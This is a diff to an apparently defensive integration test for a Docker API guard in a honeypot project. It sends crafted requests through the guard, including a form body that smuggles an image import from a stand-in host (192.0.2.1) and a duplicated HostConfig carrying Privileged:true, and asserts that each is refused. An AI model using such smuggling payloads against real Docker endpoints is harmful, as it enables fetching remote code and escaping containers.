@@ -62,6 +62,23 @@ def _free_port() -> int:
     return port
 
 
+def _raw(sock: str, method: str, target: str, body: bytes, content_type: str | None) -> bytes:
+    """One hand-written HTTP request to the guard: the docker SDK will not send these."""
+    import socket
+
+    head = f"{method} {target} HTTP/1.1\r\nHost: x\r\nContent-Length: {len(body)}\r\n"
+    if content_type:
+        head += f"Content-Type: {content_type}\r\n"
+    with socket.socket(socket.AF_UNIX) as conn:
+        conn.settimeout(20)
+        conn.connect(sock)
+        conn.sendall(head.encode() + b"\r\n" + body)
+        data = b""
+        while chunk := conn.recv(65536):
+            data += chunk
+    return data
+
+
 @skip_docker
 async def test_the_ssh_engine_works_through_the_guard_and_a_hijacked_service_is_refused():
     import docker
@@ -70,11 +87,12 @@ async def test_the_ssh_engine_works_through_the_guard_and_a_hijacked_service_is_
     from honeypot_mcp.storage.database import close_db, init_db
     from honeypot_mcp.tools.honeypot import honeypot_deploy, honeypot_self_test, honeypot_stop
 
+    upstream = _upstream_socket()  # before DOCKER_HOST is pointed at the guard
     work = tempfile.mkdtemp(prefix="hpg-it-")
     sock = os.path.join(work, "g.sock")
     guard = subprocess.Popen(
         [sys.executable, "-m", "honeypot_mcp.hardening.docker_guard", "--listen", sock,
-         "--upstream", _upstream_socket()],
+         "--upstream", upstream],
         stderr=subprocess.PIPE,
     )  # fmt: skip
     for _ in range(100):
@@ -130,6 +148,35 @@ async def test_the_ssh_engine_works_through_the_guard_and_a_hijacked_service_is_
         # And what the engine needs still works.
         listed = client.containers.list(filters={"label": "honeypot-mcp=true"})
         assert f"honeypot-{name}" in [c.name for c in listed]
+
+        # A permitted query with a form-encoded body: the daemon merges that body into the same
+        # parameters, ahead of the query, so it must never get there (the daemon is the proof).
+        form = "application/x-www-form-urlencoded"
+        import_repo = f"hpg-it-import-{uuid.uuid4().hex[:8]}/x"
+        for target, body in (
+            (
+                "/images/create?fromImage=cowrie/cowrie&tag=3.0.15",
+                f"fromImage=&fromSrc=http://192.0.2.1/x.tar&repo={import_repo}&tag=t".encode(),
+            ),
+            (f"/containers/honeypot-{name}/kill?signal=TERM", b"signal=HUP"),
+            (f"/containers/honeypot-{name}/kill", b"signal=HUP"),
+            (f"/containers/honeypot-{name}/stop", b"signal=HUP"),
+        ):
+            reply = _raw(sock, "POST", target, body, form)
+            assert reply.startswith(b"HTTP/1.1 400"), (target, reply[:120])
+        # A repeated HostConfig: the daemon would merge Privileged into the validated one.
+        dup = (
+            b'{"Image": "cowrie/cowrie:3.0.15", "Labels": {"honeypot-mcp": "true"}, '
+            b'"HostConfig": {"Privileged": true}, "HostConfig": {"CapDrop": ["ALL"]}}'
+        )
+        reply = _raw(sock, "POST", "/containers/create?name=honeypot-dup", dup, "application/json")
+        assert reply.startswith(b"HTTP/1.1 400"), reply[:120]
+
+        direct = docker.DockerClient(base_url=f"unix://{upstream}")
+        assert direct.images.list(name=import_repo) == [], "nothing was imported"
+        assert direct.containers.get(f"honeypot-{name}").status == "running"
+        with pytest.raises(docker.errors.NotFound):
+            direct.containers.get("honeypot-dup")
     finally:
         if deployed:
             await honeypot_stop(name=name, remove=True)
